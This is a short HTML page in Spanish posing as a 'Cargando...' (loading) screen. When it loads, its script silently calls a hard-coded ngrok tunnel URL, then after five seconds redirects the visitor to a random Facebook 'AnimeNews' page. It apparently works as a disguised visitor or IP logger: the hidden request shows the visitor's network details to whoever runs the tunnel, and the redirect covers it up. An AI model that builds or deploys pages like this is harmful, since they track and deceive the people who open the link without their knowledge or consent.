<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
    <style>
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f0f0f0; }
    </style>
</head>
<body>
  <script>
      // Dirección IP del servidor (cambia esto a la URL de ngrok)
      const serverIp = "https://a277-152-207-109-86.ngrok-free.app"; // Cambia esto a la URL de ngrok

      // Enviar un paquete al servidor
      fetch(serverIp + '/get-info') // Asegúrate de que la ruta sea correcta
          .then(response => {
              if (response.ok) {
                  return response.json(); // Procesar la respuesta como JSON
              } else {
                  throw new Error("Error al enviar el paquete");
              }
          })
          .then(data => {
              console.log("Respuesta del servidor:", data);
          })
          .catch(error => {
              console.error("Error en la conexión:", error);
          });

      // Redirigir a una página de Facebook después de 5 segundos
      setTimeout(() => {
          const urls = [
              "https://www.facebook.com/AnimeNews1",
              "https://www.facebook.com/AnimeNews2",
              "https://www.facebook.com/AnimeNews3",
              "https://www.facebook.com/AnimeNews4"
          ];
          const randomUrl = urls[Math.floor(Math.random() * urls.length)];
          window.location.href = randomUrl;
      }, 5000); // 5000 milisegundos = 5 segundos
  </script>
</body>
</html>
